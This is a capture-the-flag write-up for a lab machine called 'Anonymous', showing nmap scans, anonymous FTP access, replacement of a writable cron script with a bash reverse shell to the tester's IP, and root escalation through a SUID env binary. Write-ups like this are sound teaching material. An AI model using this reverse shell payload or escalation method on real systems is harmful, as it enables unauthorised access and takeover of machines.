
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-1.png)

In this room i encountered 2 services, and both of them allowed anyone to connect to them and worse, to upload files.

As always, let's start with a ports scanning.

```text
# Nmap 7.80 scan initiated Sat Nov  7 05:34:01 2020 as: nmap -sS -T4 -o first.txt 10.10.180.211
Nmap scan report for 10.10.180.211
Host is up (0.078s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Sat Nov  7 05:34:05 2020 -- 1 IP address (1 host up) scanned in 3.86 seconds
```

Let's also do a more in depth scan with some default scripts.

```text
# Nmap 7.80 scan initiated Sat Nov  7 05:37:14 2020 as: nmap -sV -sC -p21,22,139,445 -o second.txt 10.10.180.211
Nmap scan report for 10.10.180.211
Host is up (0.076s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 16m06s, deviation: 0s, median: 16m05s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2020-11-07T10:53:38+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-07T10:53:38
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Nov  7 05:37:36 2020 -- 1 IP address (1 host up) scanned in 22.41 seconds
```
From the second scan i noticed the ftp server allows anonymos login and also allows anyone to write/add files to the server. The anonymous login means i can login the default credentials ftp:ftp. 

```text
ftp 10.10.180.211
Connected to 10.10.180.211.
220 NamelessOne's FTP Server!
Name (10.10.180.211:root): ftp
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls -lah
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04 19:26 .
drwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1247 Nov 07 10:54 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (800.6282 kB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (1247 bytes).
226 Transfer complete.
1247 bytes received in 0.00 secs (2.9436 MB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.01 secs (8.4080 kB/s)
ftp> exit
221 Goodbye.

```

Here is a scripts folder which has 3 files. The most useful to an attacker is the clean.sh script as it is world writeable and also is owned by a higher privileged user. I know that as the 1000 uid is given to humas users and services usually have other number range (1-999). the ftp has a uid of 113.

The to_do script has a warning:
```text
I really need to disable the anonymous login...it's really not safe
```
The removed_files.log is just a file with many lines: ```text Running cleanup script:  nothing to delete ```

To exploit this ftp server i need to upload a reverse shell with the name clean.sh. My script will overwrite the preexisting file and it will preserve the uid. If i were to upload a file with any other name, the file will belong to ftp user, and would have the uid 113. This machine has also a smb service which i will enumerate and maybe find something useful. If not, i will stick to my initial plan.

Using smbmap i was able to login with no password and noticed i can access the pics file, as it is read only.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-2.png)

The folder contains 2 pictures and based on their names, are about puppies.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-3.png)

To download the files i used the -R parameter.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-4.png)

There picture were a distraction as they didn't contained anything of use. I tried exiftool, binwalk, stegsolve.jar, and even looked at their hex representation and didn't find a specific string which denoted the use of steghide.   
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-5.png)
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-6.png)

I think it's time to apply the forementioned plan. My payload is:
```text
#!/bin/bash
bash -i >& /dev/tcp/10.8.5.181/1234 0>&1
```

Based on the result of the id command, i got a reverse shell as the user namelessone. This user is part of group lxd. This group can be used to escalate privileges to root.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-7.png)

The flag was in the home folder of the current user. Now i will further enumerate the other ways i can do privesc. Among the binaries i found the env command.

```text
find / -type f -perm /u=s 2>/dev/null
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
```

On gtfobins i found a way to use the env command to escalate privileges.

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-8.png)

When i executed the command i didn't notice any difference, but the more i looked at the result of id command i saw the added group euid with his value of 0.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Anonymous/images/119-9.png)
